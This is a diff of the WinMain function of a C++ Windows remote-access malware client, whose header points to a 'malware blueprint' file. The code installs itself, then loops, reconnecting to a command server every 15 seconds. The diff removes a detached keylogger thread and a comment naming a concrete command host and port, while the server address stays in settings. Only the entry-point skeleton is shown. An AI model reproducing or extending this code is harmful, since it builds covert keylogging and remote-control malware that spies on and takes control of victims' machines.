@@ -3,7 +3,7 @@
 /* 				BY NICK RAZIBORSKY AKA WERKAMSUS		*/
 
 /*
-		
+
 			FEATURE IDEAS: 'GDRIVE\init0\malware blueprint.txt'
 
 */
@@ -33,23 +33,20 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 {
 	//VARIABLE SETUP
 	General::lpArguments = lpCmdLine;
-	
+
 
 	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
 		return 0;
 
 
-	Client MyClient(Settings::serverIP, Settings::serverPort); //Client MyClient("nehcer.ddns.net", 38632);
-
-	std::thread Keylogger(Keylogger::StartLogger);
-	Keylogger.detach();
+	Client MyClient(Settings::serverIP, Settings::serverPort); //Client
 
 	while (true)
 	{
-		
 
-	
-	
+
+
+
 		if (!MyClient.connected)
 		{
 			while (!MyClient.Connect())
@@ -60,7 +57,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 		Sleep(15000);
 	}
 
-	
-	
+
+
 	return 0;
 }
